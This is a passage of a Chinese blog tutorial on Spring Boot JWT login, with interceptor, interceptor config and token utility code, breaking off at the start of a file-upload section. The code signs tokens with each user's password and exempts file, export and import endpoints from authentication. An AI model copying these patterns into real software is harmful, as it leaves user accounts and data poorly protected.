data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>annotation <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token comment\">// 执行认证</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_401</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"无token，请重新登录\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token comment\">// 获取 token 中的 user id</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token class-name\">String</span> userId<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            userId <span class=\"token operator\">=</span> <span class=\"token constant\">JWT</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAudience</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">JWTDecodeException</span> j<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_401</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"token验证失败，请重新登录\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token comment\">// 根据 token 中的 userid 查询数据库</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token class-name\">User</span> user <span class=\"token operator\">=</span> userService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span>userId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_401</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"用户不存在，请重新登录\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token comment\">// 用户密码加签验证 token</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token class-name\">JWTVerifier</span> jwtVerifier <span class=\"token operator\">=</span> <span class=\"token constant\">JWT</span><span class=\"token punctuation\">.</span><span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Algorithm</span><span class=\"token punctuation\">.</span><span class=\"token function\">HMAC256</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">getPassword</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            jwtVerifier<span class=\"token punctuation\">.</span><span class=\"token function\">verify</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 验证 token</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">JWTVerificationException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_401</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"token验证失败，请重新登录\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>以及注册拦截器的配置类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>interceptor<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JwtInterceptor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Bean</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Configuration</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InterceptorRegistry</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ResourceHandlerRegistry</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">WebMvcConfigurationSupport</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">InterceptorConfig</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">WebMvcConfigurationSupport</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">addResourceHandlers</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ResourceHandlerRegistry</span> registry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandler</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/swagger-ui/**\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addResourceLocations</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"classpath:/META-INF/resources/webjars/springfox-swagger-ui/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">addResourceHandlers</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">addInterceptors</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">InterceptorRegistry</span> registry<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        registry<span class=\"token punctuation\">.</span><span class=\"token function\">addInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token function\">jwtInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 配置 JWT 的拦截器规则</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">addPathPatterns</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/**\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">// 拦截所有的请求路径</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">excludePathPatterns</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/user/login\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/user/register\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/**/export\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/**/import\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/file/**\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token punctuation\">.</span><span class=\"token function\">excludePathPatterns</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/swagger**/**\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/webjars/**\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/v3/**\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/doc.html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">addInterceptors</span><span class=\"token punctuation\">(</span>registry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\">// 对象注册到容器</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">JwtInterceptor</span> <span class=\"token function\">jwtInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">JwtInterceptor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>TokenUtils.java</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>utils</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">cn<span class=\"token punctuation\">.</span>hutool<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>date<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DateUtil</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">cn<span class=\"token punctuation\">.</span>hutool<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StrUtil</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JWT</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span>algorithms<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Algorithm</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>entity<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">User</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>service<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IUserService</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">jakarta<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletRequest</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>stereotype<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Component</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RequestContextHolder</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServletRequestAttributes</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PostConstruct</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Resource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Date</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> * @Author Xh1Xxhg</pre></td></tr><tr><td data-num=\"20\"></td><td><pre> * @Date 2024-01-20 23:50</pre></td></tr><tr><td data-num=\"21\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token annotation punctuation\">@Component</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TokenUtils</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token comment\">// 为了方便调用，设置静态方法，只能使用静态成员变量</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">IUserService</span> staticUserService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token annotation punctuation\">@Resource</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">IUserService</span> userService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token annotation punctuation\">@PostConstruct</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setUserService</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>       staticUserService <span class=\"token operator\">=</span> userService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>     * 生成 token</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>     * @return</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">genToken</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> userId<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> sign<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token constant\">JWT</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">withAudience</span><span class=\"token punctuation\">(</span>userId<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 将 user id 保存到 token 里面，作为载荷</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>             <span class=\"token punctuation\">.</span><span class=\"token function\">withExpiresAt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DateUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">offsetHour</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 2 小时后 token 过期</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>             <span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Algorithm</span><span class=\"token punctuation\">.</span><span class=\"token function\">HMAC256</span><span class=\"token punctuation\">(</span>sign<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 以 password 作为 token 的密钥   //Algorithm 为加密算法</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>     * 获取当前登录的用户信息</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>     * @return user 对象</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">User</span> <span class=\"token function\">getCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>       <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>          <span class=\"token class-name\">HttpServletRequest</span> request <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestAttributes</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">RequestContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRequestAttributes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>          <span class=\"token class-name\">String</span> token <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNotBlank</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>             <span class=\"token class-name\">String</span> userId <span class=\"token operator\">=</span> <span class=\"token constant\">JWT</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAudience</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>             <span class=\"token keyword\">return</span> staticUserService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>userId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>          <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>@Component</code>  是一个注解，它允许 Spring 自动检测自定义 Bean。</p>\n<p>换句话说，无需编写任何明确的代码，Spring 就能做到：</p>\n<ul>\n<li>扫描应用，查找注解为  <code>@Component</code>  的类</li>\n<li>将它们实例化，并注入任何指定的依赖</li>\n<li>在需要的地方注入</li>\n</ul>\n<h1 id=\"文件上传\"><a class=\"anchor\" href=\"#文件上传\">#</a> 文件上传</h1>\n<h2 id=\"后端\"><a class=\"anchor\" href=\"#后端\">#</a> 后端</h2>\n<p>数据库创建新表</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121114622610.png\" alt=\"image-20240121114622610\" /></p>\n<p>新建 controller/FileController，初步完善</p>\n<figure class=\"highlight 